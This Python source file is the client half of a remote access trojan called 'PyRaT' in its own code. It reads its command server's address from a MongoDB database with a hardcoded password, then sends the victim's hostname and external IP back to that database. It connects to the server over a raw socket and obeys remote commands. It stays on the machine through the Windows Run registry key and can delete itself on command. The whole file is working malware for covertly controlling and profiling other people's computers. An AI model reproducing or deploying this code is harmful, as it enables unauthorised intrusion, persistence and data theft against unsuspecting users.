from pymongo import MongoClient
import os
import socket
import requests
import threading
import shutil
import winreg
import sys
import getpass
from time import sleep

password = "SB5aaHgp2IYtT72e"
connection_string = f"mongodb+srv://client:{password}@pyratclients.yq8xdfc.mongodb.net/?retryWrites=true&w=majority"


temp_id = "makSgabzWk"
pcname = socket.gethostname()
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
client = MongoClient(connection_string)

mydb = client["PyRaT"]
mycol = mydb["clients"]

url = 'http://myexternalip.com/raw'
r = requests.get(url)
client_ip = r.text


def addToStartup(srcpath, filename, autostart: bool = True, move: bool = True):
    if move:
        username = getpass.getuser()
        dstpath = fr"C:\Users\{username}\{filename}"
        print(dstpath, filename)
        shutil.copy(srcpath, dstpath)
        print("copied!")

    with winreg.OpenKey(
            key=winreg.HKEY_CURRENT_USER,
            sub_key=r'Software\Microsoft\Windows\CurrentVersion\Run',
            reserved=0,
            access=winreg.KEY_ALL_ACCESS,
    ) as key:
        try:
            if autostart:
                winreg.SetValueEx(key, filename, 0, winreg.REG_SZ, dstpath)
            else:
                winreg.DeleteValue(key, filename)
        except OSError:
            print("error!")
            return False
    try:
        if autostart == True:
            s.send(bytes("file succesfully added to startup!", "utf-8"))
            print("added!")
        elif autostart == False:
            s.send(bytes("file succesfully removed from startup!", "utf-8"))
            print("deleted!")
    except:
        print("ur not connected to server!")
    return True


def main():
    try:
        print("connected")
        while True:
            msg = s.recv(1024).decode("utf-8")
            if msg == "/shell":
                print("sex")
            elif "addToStartup" in msg:
                x = msg.split()
                for item in x:
                    if "path=" in item:
                        path = item.replace("path=", "")
                    elif "filename=" in item:
                        filename = item.replace("filename=", "")
                    elif "add=" in item:
                        adding = item.replace("add=", "")

                print(path, filename, adding)
                if adding == "True":
                    addToStartup(path, filename, True)
                elif adding == "False":
                    addToStartup(path, filename, False)
            elif msg == "kill":
                filename = os.path.basename(sys.argv[0])
                curpath = sys.argv[0]
                print(curpath, filename)
                addToStartup(curpath, filename, False, False)
                os.remove(curpath)
                s.close()
                exit()

            else:
                print(msg)
    except:
        print("disconnected. trying again in 1 minute")
        sleep(10)
        connecting()





def connecting():
    global ip, port
    ip = x["ip"]
    port = x["port"]
    print(ip, port)
    def conn():
        try:
            s.connect((ip, int(port)))

        except:
            print("connection error")
            print(ip, port)
            sleep(10)
            conn()
    conn()
    threading.Thread(target=main, args=()).start()
    s.send(bytes(f"{pcname}", "utf-8"))




query = {"_id" : f"{temp_id}" }

info = mycol.find(query)

for x in info:
    info_list = x

if info_list["first_connection?"] == True:
    print("sex")
    myquery = { "first_connection?": True, "name" : "0", "client_ip" : "0" }
    newvalues = { "$set": { "first_connection?": False, "name": f"{pcname}", "client_ip" : f"{client_ip}" } }
    mycol.update_one(myquery, newvalues)

    for x in mycol.find({},{ "_id": 0, "ip": 1, "port" : 1 }):
        print(x)
    connecting()

    filename = os.path.basename(sys.argv[0])
    curpath = sys.argv[0]
    print(curpath, filename)
    addToStartup(curpath, filename, True)


else:

    for x in mycol.find({},{ "_id": 0, "ip": 1, "port" : 1 }):
        print(x)
    connecting()















